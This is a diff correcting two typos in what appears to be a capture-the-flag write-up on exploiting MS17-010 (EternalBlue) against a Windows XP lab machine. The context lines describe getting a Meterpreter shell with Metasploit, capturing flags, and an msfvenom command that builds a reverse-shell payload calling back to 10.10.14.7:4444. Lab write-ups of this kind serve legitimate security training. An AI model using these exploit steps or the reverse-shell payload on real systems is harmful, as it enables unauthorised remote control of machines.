@@ -37,7 +37,7 @@ The first one is the EternalBlue exploit. Since I have already covered this vuln
 Set options and run exploit however exploit failed and no session was created. This is due to the target running Windows 5.1 86x (32-bit) and this exploit only works on targets that are running x64 (64-bit) machines.  
 <img width="827" alt="image" src="https://user-images.githubusercontent.com/114961392/201552234-baf97d90-dd98-41cc-b4b0-0cc2afeeb3f0.png">
 
-Let's try the /windows/smb/ms17_010_psexec exploit. Set the opeions and run the exploit. WOOSHKAH, we have a meterpreter shell.  
+Let's try the /windows/smb/ms17_010_psexec exploit. Set the options and run the exploit. WOOSHKAH, we have a meterpreter shell.  
 <img width="502" alt="image" src="https://user-images.githubusercontent.com/114961392/201552561-ae3a4041-497a-495b-9035-5896ef8c81d5.png">
 
 From here we can navigate to John's desktop to capture the user flag.  
@@ -50,7 +50,7 @@ Then we can navigate straight to the Administrators directory and capture the ro
 
 ### MS17-010
 
-Now that I have conpromised the target with Metasploit, let's have a look at some manual exploits. After doing some research for MS17-010, I found an interesting exploit on Github from [helviojunior](https://github.com/helviojunior/MS17-010). I will be using the send_and_execute.py script to send and execute a crafted payload from msfvenom.  
+Now that I have compromised the target with Metasploit, let's have a look at some manual exploits. After doing some research for MS17-010, I found an interesting exploit on Github from [helviojunior](https://github.com/helviojunior/MS17-010). I will be using the send_and_execute.py script to send and execute a crafted payload from msfvenom.  
 First, let's create the payload with msfvenom.  
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.7 LPORT=4444 EXITFUNC=thread -f exe -a x86 --platform windows -o payload.exe  
 <img width="677" alt="image" src="https://user-images.githubusercontent.com/114961392/201569393-0eca9563-3dd3-4bfe-8896-b3f0e9755055.png">
